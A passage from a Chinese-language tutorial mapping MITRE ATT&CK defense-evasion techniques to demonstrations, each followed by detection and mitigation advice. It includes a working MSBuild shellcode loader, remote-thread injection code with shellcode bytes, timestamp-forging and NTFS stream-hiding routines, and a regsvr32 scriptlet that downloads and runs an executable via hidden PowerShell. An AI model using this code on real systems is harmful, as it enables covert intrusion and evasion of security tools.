0xC1, 0xCF,                                      0x0D, 0x03, 0xF8, 0x45, 0x80, 0x7D, 0xFF, 0x00, 0x75, 0xF0, 0x8D, 0x04, 0x0F, 0x3B, 0x44, 0x24,                                      0x18, 0x74, 0x20, 0x8B, 0x44, 0x24, 0x1C, 0x43, 0x3B, 0x5C, 0x24, 0x14, 0x72, 0xCF, 0x8B, 0x56,                                      0x18, 0x85, 0xD2, 0x0F, 0x85, 0x6B, 0xFF, 0xFF, 0xFF, 0x33, 0xC0, 0x5F, 0x5E, 0x5D, 0x5B, 0x83,                                      0xC4, 0x10, 0xC3, 0x8B, 0x74, 0x24, 0x10, 0x8B, 0x44, 0x16, 0x24, 0x8D, 0x04, 0x58, 0x0F, 0xB7,                                      0x0C, 0x10, 0x8B, 0x44, 0x16, 0x1C, 0x8D, 0x04, 0x88, 0x8B, 0x04, 0x10, 0x03, 0xC2, 0xEB, 0xDB                                 };               UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,                 MEM_COMMIT, PAGE_EXECUTE_READWRITE);               Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);               IntPtr hThread = IntPtr.Zero;               UInt32 threadId = 0;               IntPtr pinfo = IntPtr.Zero;               hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);               WaitForSingleObject(hThread, 0xFFFFFFFF);               return true;           }          }            ]]>       </Code>     </Task>   </UsingTask> </Project>

该XML文件中包含的C#代码，采用了VirtualAlloc()申请内存空间，并将Shellcode拷贝到该地址，最后调用CreateThread()创建线程开始执行，并等待shellcode执行完毕后退出。其中Shellcode由VS编译生成的可执行文件提取而来,运行后弹出提示框。如下图所示：

![2.png](https://image.3001.net/images/20191226/15773305468665.png!small)

使用CMD执行”MSBuild execute shellcode.xml” 指定的shellcode 便执行起来

![3.png](https://image.3001.net/images/20191226/15773305579556.png!small)

**检查及限制方案**

使用进程监视工具来监视MSBuild.exe，dnx.exe，rcsi.exe，WinDbg.exe，cdb.exe和tracker.exe的执行和参数,
将这些二进制文件的最近调用与已知良好参数的调用进行比较，已确定异常活动和潜在的对抗活动。这些实用程序很可能会被软件开发人员使用或用于其他与软件开发相关的任务，因此，如果该程序存在并在该用途之外进行使用，则该事件可能是可疑的。对调用实用程序之前和之后使用的命令参数进行分析，
也可能对确定该可执行文件的来源和目的有帮助。

**参考链接**

> Attck：<https://attack.mitre.org/techniques/T1127/>
>
> MSBuild：<https://docs.microsoft.com/zh-> cn/visualstudio/msbuild/msbuild?view=vs-2019>
>
> Use MSBuild To Do More：<https://3gstudent.github.io/3gstudent.github.io/Use-> MSBuild-To-Do-More/>

###  5、时间戳伪装

**原理及代码介绍**

系统中的每一个文件，都有着与时间有关的属性，如文件创建时间、最后一次修改时间及文件最后一次的访问时间等属性。为了使某些文件看起来更像是原本就存在于文件夹中，而不是后来新加入的，恶意软件通常会修改文件的
**时间戳** ，对于某些取证工具或者分析人员而言，经过调整文件时间与大部分已有文件一致，使得文件不会显得那么明显，从而能够逃避部分 **主机取证分析**
。

Att&CK中列举了诸多APT攻击所采用的更改时间戳的防御手段，如伪造PE文件编译时间、修改为desktop.ini文件的时间戳、或是修改恶意文件为Kernel32.dll的文件时间等等，在进行分析的过程中，文件的时间戳也是判断文件来源及合法性的一个有利依据，通过将文件的时间戳改为和系统文件一致，或许可以干扰人工分析的视线，如下的代码演示了利用系统文件Kernel32.dll的时间戳来伪造任意文件的时间戳的过程。

    
    
    bool change_time_usekernel32(TCHAR* file_path) {     bool ret = false;     TCHAR sysdir[MAX_PATH];     TCHAR kernel32_path[MAX_PATH];     HANDLE kernel32_handle = INVALID_HANDLE_VALUE;     HANDLE targetfile_handle = INVALID_HANDLE_VALUE;     FILETIME create_time;     FILETIME lastaccess_time;     FILETIME lastwrite_time;     //获取kernel32.dll模块的文件时间     GetSystemDirectory(sysdir, MAX_PATH);     wsprintf(kernel32_path, _TEXT("%s%s"), sysdir, _TEXT("\\kernel32.dll"));     kernel32_handle = CreateFile(kernel32_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);     if (kernel32_handle == INVALID_HANDLE_VALUE)     {         goto Error_Exit;     }     if(!GetFileTime(kernel32_handle, &create_time, &lastaccess_time, &lastwrite_time))     {         goto Error_Exit;     }     //重置目标文件的文件时间     targetfile_handle = CreateFile(file_path, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);     if (targetfile_handle == INVALID_HANDLE_VALUE)     {         goto Error_Exit;     }     if (!SetFileTime(targetfile_handle, &create_time, &lastaccess_time, &lastwrite_time))     {         goto Error_Exit;     }     ret = true; Error_Exit:     if (targetfile_handle != INVALID_HANDLE_VALUE)     {         CloseHandle(targetfile_handle);     }     if (kernel32_handle != INVALID_HANDLE_VALUE)     {         CloseHandle(kernel32_handle);     }     return ret; } int _tmain(int argc, _TCHAR* argv[]) {     change_time_usekernel32(_TEXT("test.txt"));     return 0; }

Kernel32的时间戳如下:

![1.png](https://image.3001.net/images/20191226/15773306076335.png!small)

修改前后的文件时间如下：

![2.png](https://image.3001.net/images/20191226/15773306181929.png!small)

如果将恶意文件放在系统目录，并伪装成Kernel32的时间戳，对于部分人工分析取证手段会具有一定迷惑性。

**检查及限制方案**

> 1、 可以使用文件修改监视工具来监视文件的时间戳更改情况，并记录日志以便后续进行分析和筛查。
>
> 2、 这种攻击技术无法通过预防性控制来缓解，因为它基于滥用系统功能。

**参考链接**

> Att&ck：<https://attack.mitre.org/techniques/T1099/>

###  6、PubPrn代理脚本代码执行

**原理及代码介绍**

随着恶意的脚本文件不断增加，在某些系统环境中，管理人员可能使用白名单来阻止未签名的Windows Script
Host（WSH）脚本文件运行，但是通过将恶意代码“注入”到Microsoft签名的脚本中，使用 **受信任证书**
签名的脚本代理执行恶意脚本文件，从而可以绕过系统中的 **签名验证** 和部分杀软的 **应用程序白名单** 验证绕过。

Windows系统中存在的PubPrn.vbs由Microsoft签名，恶意利用该脚本可以代理远程脚本文件的执行，以突破部分安全限制。利用的命令如下：

    
    
    pubprn.vbs 127.0.0.1 script:http://127.0.0.1/sc.sct

Pubprn脚本的位置在system32的子目录中，本身是用于打印相关的工作。

![1.png](https://image.3001.net/images/20191226/15773306614616.png!small)

在其脚本中，68行的位置使用了来自参数中的内容，将该内容传递给GetObject()函数,
鉴于此使用者可以在此处指定网络文件以执行自定义的脚本文件。Pubprn的利用只是一个样例，安全人员以此为基础可以了解此类内置脚本的利用方法，以便在安全分析过程识破攻击者的意图。

![2.png](https://image.3001.net/images/20191226/15773306705074.png!small)

以下为打开计算器的脚本文件

![3.png](https://image.3001.net/images/20191226/15773306837057.png!small)

执行该命令，脚本得以执行弹出计算器

![4.png](https://image.3001.net/images/20191226/15773306918578.png!small)

**检查及限制方案**

 **检查方法：**

> 1、审查和监视脚本执行中的命令行参数，必要的时候审查参数和脚本执行流程，已确定是否被恶意利用。

 **缓解措施:**

> 1、 在特定环境中，对于不必要的签名脚本，将系统配置为阻止脚本执行的应用程序白名单，以防止对手潜在的滥用。

**参考链接**

> 1、 Att&ck：<https://attack.mitre.org/techniques/T1216/>
>
> 2、 Pubprn.vbs : <https://docs.microsoft.com/en-us/previous-> versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753116(v=ws.11)>

###  7、签名二进制程序代理执行

**原理及代码介绍**

使用受信任的数字证书签名的二进制文件可以在受数字签名验证保护的Windows系统上执行，Windows中默认安装了一些由Microsoft签名的二进制文件，可用于代理其他文件的执行。攻击者可能会滥用这些行为来执行恶意文件，从而可以绕过操作系统中的杀毒软件
**应用程序白名单** 检测及操作系统的 **数字签名验证** 。

 **Msiexec.exe**

misexec.exe 是Windows Installer
的命令行程序，该工具主要用于执行后缀为.msi的软件安装程序，攻击者可以使用msiexec.exe来启动恶意的msi文件以执行恶意代码，可以使用msiexec来启动本地或者网络上可访问的MSI文件，另外msiexec.exe也可以用于执行DLL。

攻击者常用的Msiexec.exe 命令行参数如下：

    
    
        msiexec.exe /q /i "C:\path\to\file.msi"     msiexec.exe /q /i http[:]//site[.]com/file.msi     msiexec.exe /y "C:\path\to\file.dll"

为了演示滥用msiexec.exe发起攻击， 介绍一种msi文件的构建方法。通过使用Advanced Installer
工具，可以快速构建MSI文件，并执行脚本代码、可执行程序或者是调用动态链接库函数。打开Advanced
Installer创建一个simple类型的安装工程，并在Custom Actions页面加入自定义的操作。

![1.png](https://image.3001.net/images/20191226/15773308606389.png!small)

可以按需要添加希望执行的操作及条件，其中支持的Action非常丰富，下面以运行Powershell脚本为例，让msi文件在运行之初，执行一段Powershell脚本。

![2.png](https://image.3001.net/images/20191226/15773308733669.png!small)

编译生成MSI文件后，通过Msiexec调用该MSI文件执行情况如下。PowerShell代码在MSI文件加载之初得以执行。

![3.png](https://image.3001.net/images/20191226/15773308958986.png!small)

**Mavinject.exe**

Mavinject是Windows上的一个合法组件，使用该程序可以向正在运行的进程中注入任意代码执行，由于它是Windows上的常见组件且具有数字签名，常被攻击者恶意使用以隐蔽执行代码。通过如下的方式调用Mavinject，可以将DLL注入到运行的进程中：

    
    
    MavInject.exe <PID> /INJECTRUNNING <PATH DLL>

 **Odbcconf文件**

Odbcconf.exe是Windows系统默认自带的工具程序，可以用于配置开放式数据库（OBDC）驱动程序和数据源名称。使用odbcconf工具可以加载DLL并执行，其命令行参数如下：

    
    
    odbcconf.exe /S /A {REGSVR "C:\Users\Public\file.dll"}

**检查及限制方案**

> 1、
> 监视可能用于代理恶意代码执行的已签名二进制文件的进程和命令行参数，例如msiexec.exe从网上下载MSI文件并执行，可能表明存在异常。将各种活动与其他可疑行为相关联，以减少可能由于用户和管理员的良性使用而导致的误报。
>
> 2、 如用户环境中更需要使用这些二进制文件，可以将它们的执行限制在需要使用它们的特权账户或者租中，以减少被恶意滥用的机会。

**参考链接**

> Att&CK：<https://attack.mitre.org/techniques/T1218/>
>
> Mavinject： <https://reaqta.com/2017/12/mavinject-microsoft-injector/>
>
> OBDC 详请：<https://docs.microsoft.com/zh-cn/sql/odbc/odbcconf-> exe?view=azuresqldb-mi-current>

###  8、Regsvr32代理代码执行

**原理及代码介绍**

Regsvr32是Windows系统中的一个命令行程序，用于在Windows系统上对象链接和嵌入控件的注册及卸载工作，而攻击者同样可以利用regsvr32来执行任意的二进制文件。

攻击者会利用regsvr32来代理代码执行，以避免触发安全工具的提示， **regsvr32由Microsoft签名**
的文件，由于普通程序通常使用regsvr32进行正常操作，所以安全工具可能无法有效的区分regsvr32进程的执行以及由regsvr32加载的模块是否被恶意使用。

通过Regsvr加载系统中的scrobj.dll，可以依靠其提供的com接口解析并执行sct脚本，从而绕过进程白名单限制，而执行恶意代码。然后Regsvr具有网络和代理功能，它允许具有普通特权的用户下载并执行远程服务器上托管的脚本。所有这些操作都是通过与操作系统一起安装的已签名Microsoft二进制文件完成的。由于脚本是远程托管的，并且由合法的Microsoft二进制文件运行，因此可以绕过一些因将regsvr列入白名单的安全软件的许多
**常规检测和阻止机制** 。这种技术的变种通常被称为“Squiblydoo”攻击，并已在实际攻击行动中使用。

**Squiblydoo**
利用二进制regsvr32来下载一个XML文件，该文件包含用于在受害机器上执行代码的script。攻击者可以利用ActiveX并将自定义的Vb或JS嵌入在XML文件中，以进行任何类型的攻击。其调用命令如下：

    
    
    regsvr32.exe /s /i:http://c2/script.sct scrobj.dll

命令行中的sct文件（实际上是XML文件）中具有一个注册标记，其中可以引用VBScript或Jscript代码，该文件可能是任意后缀名，不一定必须是.sct，下面的示例代码会调用计算器并执行。

    
    
    <?XML version="1.0"?> <scriptlet> <registration   progid="TESTING"   classid="{A1112221-0000-0000-3000-000DA00DABFC}" >   <script language="JScript">     <![CDATA[       var foo = new ActiveXObject("WScript.Shell").Run("calc.exe");      ]]> </script> </registration> </scriptlet>

前面介绍过了还可以引用网络脚本并解析执行，将其中的JS代码改为如下，通过JS启动powershell，传递命令下载并执行程序.

    
    
    <?XML version="1.0"?> <scriptlet> <registration   progid="DownAndExec"   classid="{A1112231-0000-0000-3000-000DA00DABFC}" >   <script language="JScript">     <![CDATA[       var ws = new ActiveXObject("WScript.Shell");        var ps = "powershell.exe -ExecutionPolicy Bypass -windowstyle hidden -command ";       var dn = "$down = New-Object System.Net.WebClient;\                   $url = 'http://192.168.xx.xx/baidu.exe';\                   $file = '%TMP%\\baidu.exe';$down.DownloadFile($url,$file);\                   $exec = New-Object -com shell.application;$exec.shellexecute($file);\                   exit;";       ws.Exec(ps + dn);     ]]> </script> </registration> </scriptlet>

传递如下的命令，在本地搭建http服务，尝试通过网络下载该脚本并执行

    
    
    regsvr32.exe /s /i:http://192.168.xx.xx/download.txt scrobj.dll

最后成功下载并执行该脚本，并进一步下载并执行baidu.exe，该程序即为Dbgview

![1.png](https://image.3001.net/images/20191226/15773310368188.png!small)

**检查及限制方案**

使用进程监视工具监视regsvr32的执行和参数，将regsvr32的最近调用与已知良好参数和加载文件的记录进行比较，已确定是否存在异常和潜在的对抗活动。

**参考链接**

> 1、 Att&ck：<https://attack.mitre.org/techniques/T1117/>
>
> 2、 Squiblydoo：<https://www.carbonblack.com/2016/04/28/threat-advisory-> squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-> the-land/>

###  9、进程注入

**原理及代码介绍**

进程注入是一种在独立的活动进程的地址空间中执行任意代码的方法，在另一个进程的上下文中运行代码，会允许访问该进程的内存、系统资源、网络资源以及可能的特权提升。由于执行的代码由合法的程序代理执行，因此通过进程注入执行也可能会绕过部分安全产品的
**防病毒** 检测或 **进程白名单** 检测。

 **Windows**

有多种方法可以将代码注入正在运行的进程，在Windows系统中的实现方式主要包括以下列出的几类：

> **动态链接库（DLL** ）注入 **：在目标进程的内存中写入恶意DLL的路径，然后通过创建** 远程线程来调用执行。
>
> **可执行代码（Shellcode** ）注入 **：将恶意代码直接写入目标进程（在磁盘上不存储文件），然后通过创建** 远程线程
> **或者其他方式来触发** 代码执行。
>
> **线程执行劫持** ：挂起目标进程的执行线程，将恶意代码或者DLL路径写入到目标进程的线程中，然后恢复线程执行。此方法与僵尸进程相似。
>
> **异步过程调用（APC** ） **：将恶意代码附加到目标进程的** APC **队列**
> 中，当线程进入可改变状态时，将执行排队的APC函数。APC注入的一种变体是，创建一个暂停的进程，在该进程中，恶意代码可以通过APC在该进程的入口点之前获得执行机会。
>
> **线程本地存储（TLS**
> ）:TLS回调注入涉及在可执行（PE）文件中操纵指针，以达到在执行文件的原有入口点之前首先执行恶意代码，以达到注入代码执行的目的。

 **Mac及Linux**

Linux和OS X/macos系统中的注入方式大致包括：

> **LD_PRELOAD、LD_LIBRARY_PATH（Linux）、DYLD_INSERT_LIBRARIES（Mac OS X）**
> 环境变量或dlfcn应用程序编程接口（API）可用于在程序的运行过程过程中动态加载库（共享库）。
>
> **Ptrace系统调用** 可用于附加到正在运行的进程并在运行时对其进行修改。
>
> **/ proc / [pid] / mem** 提供对进程内存的访问，并可用于向进程读取/写入任意数据。由于其复杂性，该技术非常罕见。
>
> **VDSO劫持** ：通过操纵从linux-vdso.so共享库映射的代码存根，对ELF二进制文件执行运行时注入。

恶意软件通常利用进程注入来访问系统资源，从而可以对持久性和系统环境进行修改，使用命名管道或者是其他的进程间通讯（IPC）机制作为通讯通道，更复杂的样本可以执行多个过程注入以分割模块并进一步逃避检测。

下面以Windows为例，演示一下通过创建 **远程线程** 而进行 **可执行代码注入** 的操作，首先还是将可执行文件中的代码以16进制值拷贝取出

![1.png](https://image.3001.net/images/20191226/15773310887358.png!small)

如下的注入操作首先创建了记事本进程，然后在该进程中申请空间并写入代码，最后创建远程线程执行，完毕后结束进程并退出。

    
    
    unsigned char data[304] = {     0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x14, 0x53, 0x8D, 0x45, 0xEC, 0xC7, 0x45, 0xEC, 0x75, 0x73, 0x65,      0x72, 0x33, 0xDB, 0xC7, 0x45, 0xF0, 0x33, 0x32, 0x2E, 0x64, 0x50, 0xB9, 0x4C, 0x77, 0x26, 0x07,      0x66, 0xC7, 0x45, 0xF4, 0x6C, 0x6C, 0x88, 0x5D, 0xF6, 0xC7, 0x45, 0xF8, 0x74, 0x6F, 0x70, 0x73,      0x66, 0xC7, 0x45, 0xFC, 0x65, 0x63, 0x88, 0x5D, 0xFE, 0xE8, 0x1A, 0x00, 0x00, 0x00, 0xFF, 0xD0,      0x53, 0x8D, 0x45, 0xF8, 0xB9, 0x45, 0x83, 0x56, 0x07, 0x50, 0x50, 0x53, 0xE8, 0x07, 0x00, 0x00,      0x00, 0xFF, 0xD0, 0x5B, 0x8B, 0xE5, 0x5D, 0xC3, 0x83, 0xEC, 0x10, 0x64, 0xA1, 0x30, 0x00, 0x00,      0x00, 0x53, 0x55, 0x56, 0x8B, 0x40, 0x0C, 0x57, 0x89, 0x4C, 0x24, 0x18, 0x8B, 0x70, 0x0C, 0xE9,      0x8A, 0x00, 0x00, 0x00, 0x8B, 0x46, 0x30, 0x33, 0xC9, 0x8B, 0x5E, 0x2C, 0x8B, 0x36, 0x89, 0x44,      0x24, 0x14, 0x8B, 0x42, 0x3C, 0x8B, 0x6C, 0x10, 0x78, 0x89, 0x6C, 0x24, 0x10, 0x85, 0xED, 0x74,      0x6D, 0xC1, 0xEB, 0x10, 0x33, 0xFF, 0x85, 0xDB, 0x74, 0x1F, 0x8B, 0x6C, 0x24, 0x14, 0x8A, 0x04,      0x2F, 0xC1, 0xC9, 0x0D, 0x3C, 0x61, 0x0F, 0xBE, 0xC0, 0x7C, 0x03, 0x83, 0xC1, 0xE0, 0x03, 0xC8,      0x47, 0x3B, 0xFB, 0x72, 0xE9, 0x8B, 0x6C, 0x24, 0x10, 0x8B, 0x44, 0x2A, 0x20, 0x33, 0xDB, 0x8B,      0x7C, 0x2A, 0x18, 0x03, 0xC2, 0x89, 0x7C, 0x24, 0x14, 0x85, 0xFF, 0x74, 0x31, 0x8B, 0x28, 0x33,      0xFF, 0x03, 0xEA, 0x83, 0xC0, 0x04, 0x89, 0x44, 0x24, 0x1C, 0x0F, 0xBE, 0x45, 0x00, 0xC1, 0xCF,      0x0D, 0x03, 0xF8, 0x45, 0x80, 0x7D, 0xFF, 0x00, 0x75, 0xF0, 0x8D, 0x04, 0x0F, 0x3B, 0x44, 0x24,      0x18, 0x74, 0x20, 0x8B, 0x44, 0x24, 0x1C, 0x43, 0x3B, 0x5C, 0x24, 0x14, 0x72, 0xCF, 0x8B, 0x56,      0x18, 0x85, 0xD2, 0x0F, 0x85, 0x6B, 0xFF, 0xFF, 0xFF, 0x33, 0xC0, 0x5F, 0x5E, 0x5D, 0x5B, 0x83,      0xC4, 0x10, 0xC3, 0x8B, 0x74, 0x24, 0x10, 0x8B, 0x44, 0x16, 0x24, 0x8D, 0x04, 0x58, 0x0F, 0xB7,      0x0C, 0x10, 0x8B, 0x44, 0x16, 0x1C, 0x8D, 0x04, 0x88, 0x8B, 0x04, 0x10, 0x03, 0xC2, 0xEB, 0xDB }; bool inject_to_notepad() {     bool ret = false;     PBYTE sc;     DWORD cb;     HANDLE nthd;     STARTUPINFO si;     PROCESS_INFORMATION pi;     memset(&si, 0, sizeof(si));     memset(π, 0, sizeof(pi));     sc = NULL;     si.cb = sizeof(si);     if(!CreateProcess(_TEXT("c:\\windows\\system32\\notepad.exe"), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, π))     {         goto SAFE_EXIT;     };     sc = (PBYTE)VirtualAllocEx(pi.hProcess, NULL, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);     if (sc == NULL)     {         goto SAFE_EXIT;     }         if (!WriteProcessMemory(pi.hProcess, sc, data, sizeof(data)/sizeof(char), &cb) || cb != sizeof(data)/sizeof(char))     {         goto SAFE_EXIT;     }     nthd = CreateRemoteThread(pi.hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)sc, NULL, NULL, NULL);     if (nthd == NULL)     {         goto SAFE_EXIT;     }     WaitForSingleObject(nthd,  INFINITE);     ret = true; SAFE_EXIT:     if (sc != NULL)     {         VirtualFreeEx(pi.hProcess, sc, 0, MEM_RELEASE);     }     if (pi.hProcess != NULL)     {         TerminateProcess(pi.hProcess, 0);         CloseHandle(pi.hProcess);     }     return ret; } int _tmain(int argc, _TCHAR* argv[]) {     inject_to_notepad();     return 0; }

执行后情况如下：

![2.png](https://image.3001.net/images/20191226/15773310993298.png!small)

通过Process Hacker检查一下记事本的线程，发现我们远程创建的线程已经执行，执行了MessageBox()函数

![3.png](https://image.3001.net/images/20191226/15773311075677.png!small)

**检查及限制方案**

 **检查方法：**

> 1、
> 通常为完成进程注入都需要执行一系列操作，放在程序中体现便是需要调用一系列相关API，在Windows系统中可以通过监控程序调用的API序列确定是否有进程注入相关操作。如CreateRemoteThread，SuspendThread
> / SetThreadContext / ResumeThread，QueueUserAPC /
> NtQueueApcThread之类的API调用可用于修改另一个进程内的内存（如WriteProcessMemory）的API调用。
>
> 2、
> 在Linux系统中监视特定的调用，如（例如ptrace系统调用，LD_PRELOAD环境变量的使用或dlfcn动态链接API调用），由于其专门的性质，不应生成大量数据，并且可以是检测过程注入的有效方法。
>
> 3、
> 监视进程和命令行参数以了解在代码注入发生之前或之后可以执行的操作，并将信息与相关事件信息相关联。还可以使用PowerShell和诸如PowerSploit
> 之类的工具执行代码注入，因此可能需要其他PowerShell监视才能涵盖此行为的已知实现。

 **缓解方案：**

进程注入属于滥用系统功能导致的安全问题

> 1、 终端行为防御：可以安装HIPS软件，监测注入过程中调用的常见API序列，来识别并阻止某些类型的进程注入操作。
>
> 2、
> 特权账户管理：针对Linux内核系统，通过仅限制特权用户使用ptrace来利用Yama减轻基于ptrace的进程注入。其他缓解措施包括部署安全内核模块，这些模块提供高级访问控制和流程限制，例如SELinux，grsecurity和AppAmour。

**参考链接**

> 1、 Att&CK：<https://attack.mitre.org/techniques/T1055/>

###  10、利用NTFS ADS进行数据隐藏

**原理及代码介绍**

在NTFS文件系统中，每个NTFS格式的分区都包含一个主文件表结构（Master File
Table），这个表结构中保存了该分区上每个文件及目录的相关信息。在MFT结构中还保存着文件属性， 如 Extended Attributes (EA) 及
Data(当存在多个数据属性时称为Alternate Data Streams
，交换数据流，即ADS)，而用户可以为文件新建交换数据流，并将存储任意二进制数据在其中，如将完整的文件在其中，而在Windows系统的资源管理器中，
**载体文件不会有任何变化（如文件大小、时间戳）** ，攻击者完全可以利用该特性将 **完整的文件隐藏在交换流** 中。

ADS的应用，这里笔者将举个简单的例子进行说明， 相信读者有通过Internet
Explorer下载过可执行文件，然后在运行的时候收到如下图所示的警告，这是其实就是ADS的运用。

![1.png](https://image.3001.net/images/20191226/15773311639700.png!small)

在文件下载完成后， IE会在文件上加入一个ADS。该ADS将存储一个标签，以便Windows了解文件是从哪个区域下载的。

![2.png](https://image.3001.net/images/20191226/15773311731814.png!small)

可以通过Powershell和stream.exe（sysinternals工具包中有提供）来操作（ **新增** 、 **查看** 、 **修改、删除**
）文件中的ADS，用如下的命令查看

![3.png](https://image.3001.net/images/20191226/15773311829331.png!small)

该文件是经IE下载的，其存在一个名为“Zone.Identfier”的流，其中保存了文件是从IE下载的标示，我们通过将文件复制到真机，再拖回虚拟机再看一下，可以看到同样的文件，其附加的属性已经不存在。

![4.png](https://image.3001.net/images/20191226/15773311908098.png!small)

ADS的操作也可以通过CMD命令进行操作，其操作方法如下：

    
    
    <载体文件路径>:<ADS名称>

如使用echo命令创建并写入数据到ADS中：

    
    
    echo for test > sc.dat:stream

![5.png](https://image.3001.net/images/20191226/15773312012901.png!small)

可见的是，文件大小为0。使用stream.exe可以看到存在一个名为stream的交换流

![6.png](https://image.3001.net/images/20191226/1577331209114.png!small)

攻击者可能会将恶意数据或者二进制文件存储在文件的备用流（ADS）中，而不是直接存储在文件中，这种技术可用于 **文件隐藏** 、 **防病毒软件静态扫描**
、 **主机取证分析** 等安全手段的 **绕过** 。

如下的代码演示在ADS中隐藏完整的文件及存取等操作。

    
    
    bool set_ads(TCHAR* host_file,TCHAR* payload_filepath) {     bool ret = false;     BYTE read_buf[0x1000];     DWORD read_cb, write_cb;     TCHAR finalpath_buf[MAX_PATH * 2];     HANDLE final_handle = INVALID_HANDLE_VALUE;     HANDLE payload_handle = INVALID_HANDLE_VALUE;     wsprintf(finalpath_buf, _TEXT("%s:stream_name"), host_file);     final_handle = CreateFile(finalpath_buf, FILE_ALL_ACCESS,         FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);     if (final_handle == INVALID_HANDLE_VALUE)     {         goto SAFE_EXIT;     }     payload_handle = CreateFile(payload_filepath, FILE_READ_ACCESS,         FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);     if (payload_handle == INVALID_HANDLE_VALUE)     {         goto SAFE_EXIT;     }     do      {         if (!ReadFile(payload_handle, read_buf, 0x1000, &read_cb, NULL))         {             goto SAFE_EXIT;         }         if (!WriteFile(final_handle, read_buf, read_cb, &write_cb, NULL) && write_cb != read_cb)         {             goto SAFE_EXIT;         }         if (read_cb != 0x1000)         {             break;         }     } while (true);     ret = true; SAFE_EXIT:     if (final_handle != INVALID_HANDLE_VALUE)     {         CloseHandle(final_handle);     }     if (payload_handle != INVALID_HANDLE_VALUE)     {         CloseHandle(payload_handle);     }     return ret; } bool read_ads(TCHAR* host_path, TCHAR* stream_name, TCHAR* save_path) {     bool ret = false;     BYTE read_buf[0x1000];     DWORD read_cb, write_cb;     TCHAR finalpath_buf[MAX_PATH * 2];     HANDLE stream_handle = INVALID_HANDLE_VALUE;     HANDLE save_handle = INVALID_HANDLE_VALUE;     wsprintf(finalpath_buf, _TEXT("%s:%s"), host_path, stream_name);     stream_handle = CreateFile(finalpath_buf, FILE_ALL_ACCESS,         FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);     if (stream_handle == INVALID_HANDLE_VALUE)     {         goto SAFE_EXIT;     }     save_handle = CreateFile(save_path, FILE_WRITE_ACCESS,         FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);     if (save_handle == INVALID_HANDLE_VALUE)     {         goto SAFE_EXIT;     }     do      {         if (!ReadFile(stream_handle, read_buf, 0x1000, &read_cb, NULL))         {             goto SAFE_EXIT;         }         if (!WriteFile(save_handle, read_buf, read_cb, &write_cb, NULL) && write_cb != read_cb)         {             goto SAFE_EXIT;         }         if (read_cb != 0x1000)         {             break;         }     } while (true);     ret = true; SAFE_EXIT:     if (stream_handle != INVALID_HANDLE_VALUE)     {         CloseHandle(stream_handle);     }     if (save_handle != INVALID_HANDLE_VALUE)     {         CloseHandle(save_handle);     }     return ret; } int _tmain(int argc, _TCHAR* argv[]) {     if(set_ads(_TEXT("c:\\windows\\tasks\\sc.dat"), _TEXT("help.txt")))     {         _tprintf(_TEXT("set fail!!!\r\n"));     }     if(read_ads(_TEXT("c:\\windows\\tasks\\sc.dat"),_TEXT("stream_name"), _TEXT("help_fromads.txt")))     {         _tprintf(_TEXT("read fail!!!\r\n"));     }     return 0; }

**检查及限制方案**

> 1、通过dir /r命令可以显示目录中含有ADS的文件，在找到不合法的交换流后删除掉即可。
>
> 2、通过Sysinternals提供的Streams工具来查询文件是否具有ADS，同时可以用该工具删除
>
> 3、使用Powershell命令来与ADS交换和操作，如 **Get-Item** ， **Set-Item** ， **Remove-Item** 和
> **Get-ChildItem** .

**参考链接**

> 1: Att&ck：<https://attack.mitre.org/techniques/T1096/>
>
> 2: Microsoft
> ADS：<https://blogs.technet.microsoft.com/askcore/2013/03/24/alternate-data-> streams-in-ntfs/>

###  11、Mshta代理执行脚本代码

**原理及代码介绍**

Mshta.exe 是执行Microsoft HTML
应用程序（HTA）的内置工具，在Windows系统中默认自带该工具。HTA文件的扩展名为“.hta”, HTA是独立的应用程序，他们使用与Internet
Explorer相同的模型和技术执行，但是并不通过浏览器进行执行，而在浏览器之外。

攻击者可以通过制作恶意HTA文件（如带有恶意 **Javascript** 或 **VBScript**
代码执行）并调用Mshta.exe执行以绕过系统或是 **反病毒软件** 提供的 **应用程序白名单检测** 、 **数字证书验证** 等安全检查。

可以直接调用Mshta.exe并传递脚本代码进行执行：

    
    
    mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))

也可以调用Mshta并传递hta文件URL进行下载执行：

    
    
    mshta http[:]//webserver/payload[.]hta

通过Mshta.exe代理执行脚本代码，可以用于 **绕过** 没有阻止其执行的 **应用程序白名单限制** 解决方案，由于mshta在Internet
Explorer的安全上下文之外执行，因此它也绕过了浏览器安全设置。

下面将分别列举攻击者的2种利用手段：

1、 mshta直接执行脚本代码

    
    
    mshta about:”<script language = “vbscript” src=”http://127.0.0.1/test.vbs”> code </script>”

在本地搭建http服务器将test.vbs加载进去

![1.png](https://image.3001.net/images/20191226/15773312553627.png!small)

执行CMD命令启动mshta

![2.png](https://image.3001.net/images/20191226/15773312648042.png!small)

2、 mshta执行hta脚本文件

构建如下的HTA脚本，其中引用外部的脚本文件

![3.png](https://image.3001.net/images/20191226/15773312733653.png!small)

执行情况如下

![4.png](https://image.3001.net/images/20191226/15773312915850.png!small)

**检查及限制方案**

 **检查方法：**

> 1、使用进程监视工具来监视mshta.exe的执行和参数。
>
> 2、在命令行中寻找执行原始脚本或混淆脚本的mshta.exe。
>
> 3、将mshta.exe的最近调用与已知良好参数的历史执行记录进行对比，已确定异常和潜在的对抗活动。

 **缓解方案：**

> 1、如果在特定环境中mshta.exe不是必须的， 可以考虑删除或者禁用该组件。
>
